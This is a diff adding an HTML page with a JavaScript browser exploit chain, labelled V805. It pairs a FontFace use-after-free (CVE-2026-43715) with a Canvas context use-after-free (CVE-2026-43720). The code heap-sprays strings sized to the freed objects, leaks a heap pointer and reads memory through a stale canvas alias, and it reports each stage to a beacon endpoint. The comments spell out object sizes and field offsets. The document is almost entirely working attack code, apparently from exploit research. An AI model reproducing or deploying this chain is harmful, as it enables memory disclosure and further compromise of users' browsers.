@@ -1,0 +1,241 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>V805</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="refresh" content="180"></head>
+<body><pre id="out">V805 -- FontFace heap leak + Canvas UAF string reclaim read</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var bp=[];for(var i=0;i<1200;i++)bp.push(new Image());
+var bi=0,sq=0;
+function B(tag,data){
+  var s=String(sq).padStart(3,'0');sq++;
+  var url='/beacon/V805-'+s+'-'+tag;
+  if(data!==undefined)url+='?d='+encodeURIComponent(String(data).substring(0,900));
+  if(bi<bp.length){bp[bi].src=url;bi++;}
+  say('['+s+'] '+tag+(data!==undefined?': '+String(data).substring(0,200):''));
+}
+
+B('BOOT','v805-fontface+canvas-string-reclaim');
+
+// ============================================
+// S0: API CHECKS
+// ============================================
+var hasFF=typeof FontFace!=='undefined';
+var hasFS=typeof document.fonts!=='undefined';
+var hasFSload=hasFS&&typeof document.fonts.load==='function';
+B('ENTER-S0','FF='+hasFF+'|FS='+hasFS+'|load='+hasFSload);
+if(!hasFF||!hasFSload){B('FAIL-S0','missing-api');throw 0;}
+B('PASS-S0','api-ok');
+
+// ============================================
+// S1: FONT SETUP (FontFace UAF - CVE-2026-43715)
+// ============================================
+var faceA=new FontFace('a','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(faceA);
+B('PASS-S1-A','face-a-added');
+
+var styleEl=document.createElement('style');
+styleEl.textContent='@font-face{font-family:x;src:local(Arial);unicode-range:U+0042;}';
+document.head.appendChild(styleEl);
+B('PASS-S1-X','stylesheet-x-added');
+
+var promiseA=faceA.loaded;
+
+// ============================================
+// S2: 86-CHAR SPRAY TEMPLATE + THEN GETTER
+// CSSFontFace=192B, 86-char string=192B (EXACT MATCH)
+// m_status=Success(3) at char 55 (offset +130)
+// m_wrapper leak at chars 42-45 (offset +104)
+// ============================================
+var FF_LEN=86;
+var ffChars=new Array(FF_LEN);
+for(var c=0;c<FF_LEN;c++) ffChars[c]=0x0000;
+ffChars[55]=0x0003;
+
+var thenFired=false;
+var ffSpray=[];
+
+Object.defineProperty(FontFace.prototype,'then',{
+  get:function(){
+    if(thenFired) return undefined;
+    thenFired=true;
+    B('ENTER-THEN','getter-fired');
+    try{styleEl.parentNode.removeChild(styleEl);B('PASS-THEN-RM','ok');}catch(e){B('FAIL-THEN-RM',e.message);}
+    try{document.body.offsetHeight;B('PASS-THEN-REBUILD','ok');}catch(e){}
+    for(var s=0;s<3000;s++){
+      ffChars[85]=s&0xFFFF;
+      ffSpray.push(String.fromCharCode.apply(null,ffChars));
+    }
+    ffChars[85]=0;
+    B('PASS-THEN-SPRAY','n='+ffSpray.length);
+    return undefined;
+  },
+  configurable:true
+});
+B('PASS-S2','getter-installed');
+
+// ============================================
+// CANVAS UAF TRIGGER (CVE-2026-43720)
+// bitmaprenderer outer + 2d inner + defineProperty
+// ============================================
+var canvasCtx=null;
+function triggerCanvasUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    canvasCtx=c.getContext('2d');
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  return c;
+}
+
+// ============================================
+// S3: TRIGGER FONTFACE UAF + CHAIN
+// ============================================
+B('ENTER-S3','calling-fonts.load');
+document.fonts.load('1em a, x','AB').then(function(faces){
+  B('PASS-S3-RESOLVE','faces='+(faces?faces.length:'null'));
+
+  // ============================================
+  // S4: EXTRACT HEAP POINTER FROM FONTFACE SPRAY
+  // chars 42-45 = m_wrapper (WeakPtr written by wrapper())
+  // ============================================
+  var pW=[0,0,0,0];
+  var ffWin=-1,ffHits=0;
+  for(var s=0;s<ffSpray.length;s++){
+    var c42=ffSpray[s].charCodeAt(42);
+    var c43=ffSpray[s].charCodeAt(43);
+    var c44=ffSpray[s].charCodeAt(44);
+    var c45=ffSpray[s].charCodeAt(45);
+    if(c42!==0||c43!==0||c44!==0||c45!==0){
+      ffHits++;
+      if(ffWin<0){ffWin=s;pW=[c42,c43,c44,c45];}
+    }
+  }
+
+  if(ffWin<0){
+    B('FAIL-S4','NO-HEAP-PTR');
+    return;
+  }
+
+  var ptrHex;
+  try{
+    var ab=new ArrayBuffer(8);
+    var u16=new Uint16Array(ab);
+    u16[0]=pW[0];u16[1]=pW[1];u16[2]=pW[2];u16[3]=pW[3];
+    ptrHex='0x'+new BigUint64Array(ab)[0].toString(16).padStart(16,'0');
+  }catch(e){
+    ptrHex='0x'+('0000'+pW[3].toString(16)).slice(-4)+('0000'+pW[2].toString(16)).slice(-4)+('0000'+pW[1].toString(16)).slice(-4)+('0000'+pW[0].toString(16)).slice(-4);
+  }
+  B('PASS-S4-PTR','HEAP|idx='+ffWin+'|ptr='+ptrHex+'|hits='+ffHits);
+
+  // ============================================
+  // S5: CANVAS UAF
+  // ============================================
+  B('ENTER-S5','canvas-uaf');
+  var outerC=triggerCanvasUAF();
+  if(!canvasCtx){B('FAIL-S5','no-ctx');return;}
+  B('PASS-S5','canvas-uaf-done');
+
+  // ============================================
+  // S6: STRING RECLAIM OF CRC2D (768B)
+  // 374 chars * 2 + 20 header = 768B = CRC2D size class
+  //
+  // CRC2D offset -> char index = (offset - 20) / 2
+  //   +32  m_canvas       -> chars 6-9   = P (prevents NULL deref;
+  //                          opaqueRoot() traverses Node parent chain on P
+  //                          which is type confusion -- null canvasCtx after reads)
+  //   +112 stateStack.buf -> chars 46-49 = P (fake State lives at P)
+  //   +120 stateStack.cap -> chars 50-51 = 1
+  //   +124 stateStack.sz  -> chars 52-53 = 1
+  //
+  // state() = m_stateStack.last() = *(m_buffer) = *(P)
+  // lineWidth/miterLimit/globalAlpha are NON-VIRTUAL (WK-1400)
+  // so reading them goes: state().memberField = *(P + fieldOffset)
+  // This reads FontFace wrapper object fields as State fields
+  // ============================================
+  B('ENTER-S6','string-reclaim');
+  var CRC_LEN=374;
+  var crcChars=new Array(CRC_LEN);
+  for(var c=0;c<CRC_LEN;c++) crcChars[c]=0x0000;
+
+  crcChars[6]=pW[0];crcChars[7]=pW[1];crcChars[8]=pW[2];crcChars[9]=pW[3];
+  crcChars[46]=pW[0];crcChars[47]=pW[1];crcChars[48]=pW[2];crcChars[49]=pW[3];
+  crcChars[50]=0x0001;crcChars[51]=0x0000;
+  crcChars[52]=0x0001;crcChars[53]=0x0000;
+
+  B('PASS-S6-TPL','m_canvas=P|stateStack.buf=P|cap=1|sz=1');
+
+  var crcSpray=[];
+  for(var s=0;s<3000;s++){
+    crcChars[373]=s&0xFFFF;
+    crcSpray.push(String.fromCharCode.apply(null,crcChars));
+  }
+  B('PASS-S6-SPRAY','n='+crcSpray.length+'|sz='+CRC_LEN+'|alloc=768');
+
+  // ============================================
+  // S7: READ THROUGH STALE CANVAS ALIAS
+  // Each property reads from P + (State field offset) as float64
+  // ============================================
+  B('ENTER-S7','stale-alias-read');
+
+  var f64=new Float64Array(1);
+  var u32=new Uint32Array(f64.buffer);
+  function bits(val){f64[0]=val;return 'lo=0x'+(u32[0]>>>0).toString(16)+'|hi=0x'+(u32[1]>>>0).toString(16);}
+
+  var lwOK=false;
+  try{
+    var lw=canvasCtx.lineWidth;
+    lwOK=true;
+    B('PASS-S7-LW','val='+lw+'|'+bits(lw));
+  }catch(e){B('FAIL-S7-LW',e.message);}
+
+  try{
+    var ml=canvasCtx.miterLimit;
+    B('PASS-S7-ML','val='+ml+'|'+bits(ml));
+  }catch(e){B('FAIL-S7-ML',e.message);}
+
+  try{
+    var ga=canvasCtx.globalAlpha;
+    B('PASS-S7-GA','val='+ga+'|'+bits(ga));
+  }catch(e){B('FAIL-S7-GA',e.message);}
+
+  try{
+    var ldo=canvasCtx.lineDashOffset;
+    B('PASS-S7-LDO','val='+ldo+'|'+bits(ldo));
+  }catch(e){B('FAIL-S7-LDO',e.message);}
+
+  // CRITICAL: null stale ref immediately to prevent GC crash.
+  // visitAdditionalChildren -> opaqueRoot() traverses Node parent chain.
+  // P is NOT a Node. Any GC cycle that visits the wrapper after S6 crashes.
+  // Nulling removes strong ref so wrapper becomes unreachable.
+  canvasCtx=null;
+  crcSpray=null;
+
+  // ============================================
+  // S8: RESULT
+  // ============================================
+  if(lwOK){
+    B('PASS-S8','STRING-RECLAIM-READ-CONFIRMED|ptr='+ptrHex);
+  } else {
+    B('FAIL-S8','read-failed');
+  }
+
+}).catch(function(e){
+  B('FAIL-S3-REJECT',String(e&&e.message||e));
+});
+
+// ============================================
+// HEARTBEAT
+// ============================================
+var hbN=0;
+setInterval(function(){
+  hbN++;
+  B('HB','n='+hbN+'|then='+thenFired+'|cUAF='+(canvasCtx?'y':'n'));
+},30000);
+
+B('PASS-INIT','v805-ready');
+</script></body></html>
